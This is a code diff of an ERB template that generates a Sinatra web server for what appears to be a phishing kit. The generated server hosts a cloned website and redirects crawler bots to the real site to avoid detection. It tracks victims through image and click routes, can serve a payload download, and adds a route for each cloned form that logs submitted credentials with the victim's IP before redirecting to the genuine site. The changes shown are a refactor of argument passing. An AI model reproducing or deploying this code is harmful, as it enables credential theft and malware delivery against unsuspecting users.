@@ -12,12 +12,12 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 	# This method is used to redirect to the original site cloned when we
 	# detect it is a crawler bot.
 	block_and_redirect("<%=self[:url] %>")
-
+	<% if self[:reverse_proxy] %>
 	# Reverse Proxy Parameters:
 	# This is an automated generated list based on the src/href  reacheable
 	# by our script parser. Some might not be correctly reached and/or other
 	# could not be correctly added.
-	# reverse_proxy /RexExp/, "url/$1"<% if self[:reverse_proxy] %>
+	# reverse_proxy /RexExp/, "url/$1"
 	use Rack::ReverseProxy do <% self[:reverse_proxy].each do |proxy| %>
 		reverse_proxy /^<%= proxy[0] %>\/?(.*)$/, '<%= proxy[1] %>/$1'<% end %>
 	end
@@ -31,43 +31,39 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 	end
 
 	get "/image" do
-		process_info(params,request)
+		process_info
 		return_img
 	end
 
   get "/click" do
-  	process_info(params,request)
+  	process_info
 		redirect to params[:url] || "<%= self[:url] %>"
 	end
 
 	<% if self[:payload] %>
-
 	get "/download" do
-		process_info(params, request)
+		process_info
 		return_payload
 	end
-
 	<% end %>
 
 	get "/" do
-		process_info(params,request)
+		process_info
 		erb :index
 	end
 
 	<% if self[:url_route] != "/" && self[:url_route] != "" %>
-
 	get "<%= self[:url_route] %>" do
-		process_info(params,request)
+		process_info
 		erb :index
 	end
-
 	<% end %>
 
 	<% self[:forms_routes].each do |route| %>
 	<%= route[0] %> "<%=route[1]%>" do
 		$stdout.puts "#{Time.now} - CREDENTIALS - IP #{request.ip} - CREDS " + params.to_s
-		process_info(params,request)
-		process_cred(params,request)
+		process_info
+		process_cred
 
 		redirect to "<%= self[:url] %>"
 	end
